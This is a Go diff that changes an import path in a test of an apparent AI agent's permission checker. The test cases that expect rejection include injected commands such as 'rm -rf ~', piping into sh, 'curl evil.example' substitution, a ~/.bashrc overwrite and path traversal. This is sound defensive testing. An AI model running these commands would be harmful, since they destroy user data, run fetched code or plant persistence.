@@ -8,7 +8,7 @@ import (
 	"testing"
 	"time"
 
-	"github.com/retail-cortex/blitz/internal/tools"
+	"github.com/retail-cortex/blitz/pkg/api"
 )
 
 func TestParseSchedule(t *testing.T) {
@@ -154,36 +154,36 @@ func TestPermissions(t *testing.T) {
 		}
 		perms = append(perms, p)
 	}
-	req := func(kind tools.ActionKind, targets ...string) tools.ApprovalRequest {
-		return tools.ApprovalRequest{Kind: kind, Targets: targets}
+	req := func(kind api.ActionKind, targets ...string) api.ApprovalRequest {
+		return api.ApprovalRequest{Kind: kind, Targets: targets}
 	}
 	for _, c := range []struct {
-		req  tools.ApprovalRequest
+		req  api.ApprovalRequest
 		want bool
 	}{
-		{req(tools.ActionCommand, "go list -m -u all"), true},
-		{req(tools.ActionCommand, "go list -m -u all && rm -rf ~"), false},
-		{req(tools.ActionCommand, "git log --oneline"), true},
+		{req(api.ActionCommand, "go list -m -u all"), true},
+		{req(api.ActionCommand, "go list -m -u all && rm -rf ~"), false},
+		{req(api.ActionCommand, "git log --oneline"), true},
 		// A glob covers one command, never one chained, piped or substituted.
-		{req(tools.ActionCommand, "git log x; rm -rf ~"), false},
-		{req(tools.ActionCommand, "git log x | sh"), false},
-		{req(tools.ActionCommand, "git log $(curl evil.example)"), false},
-		{req(tools.ActionCommand, "git log `id`"), false},
-		{req(tools.ActionCommand, "git log x > ~/.bashrc"), false},
-		{req(tools.ActionCommand, "git log x\nrm -rf ~"), false},
-		{req(tools.ActionCommand, "make lint && make test"), true}, // exactly as permitted
-		{req(tools.ActionWrite, "reports/../main.go"), false},
-		{req(tools.ActionWrite, "reports/deps.md"), true},
-		{req(tools.ActionWrite, "reports/2026/deps.md"), true},
-		{req(tools.ActionWrite, "reports/deps.md", "main.go"), false}, // every target must be covered
-		{req(tools.ActionWrite, "main.go"), false},
-		{req(tools.ActionDelete, "tmp/a.log"), true},
-		{req(tools.ActionDelete, "tmp/sub/a.log"), false},
-		{req(tools.ActionNetwork, "proxy.golang.org"), true},
-		{req(tools.ActionNetwork, "evil.example"), false},
-		{req(tools.ActionMCP, "github:create_issue"), true},
-		{req(tools.ActionMCP, "github:delete_repo"), false},
-		{req(tools.ActionWrite), false}, // nothing to match
+		{req(api.ActionCommand, "git log x; rm -rf ~"), false},
+		{req(api.ActionCommand, "git log x | sh"), false},
+		{req(api.ActionCommand, "git log $(curl evil.example)"), false},
+		{req(api.ActionCommand, "git log `id`"), false},
+		{req(api.ActionCommand, "git log x > ~/.bashrc"), false},
+		{req(api.ActionCommand, "git log x\nrm -rf ~"), false},
+		{req(api.ActionCommand, "make lint && make test"), true}, // exactly as permitted
+		{req(api.ActionWrite, "reports/../main.go"), false},
+		{req(api.ActionWrite, "reports/deps.md"), true},
+		{req(api.ActionWrite, "reports/2026/deps.md"), true},
+		{req(api.ActionWrite, "reports/deps.md", "main.go"), false}, // every target must be covered
+		{req(api.ActionWrite, "main.go"), false},
+		{req(api.ActionDelete, "tmp/a.log"), true},
+		{req(api.ActionDelete, "tmp/sub/a.log"), false},
+		{req(api.ActionNetwork, "proxy.golang.org"), true},
+		{req(api.ActionNetwork, "evil.example"), false},
+		{req(api.ActionMCP, "github:create_issue"), true},
+		{req(api.ActionMCP, "github:delete_repo"), false},
+		{req(api.ActionWrite), false}, // nothing to match
 	} {
 		if got := Allows(perms, c.req); got != c.want {
 			t.Errorf("%v %v: %v, want %v", c.req.Kind, c.req.Targets, got, c.want)
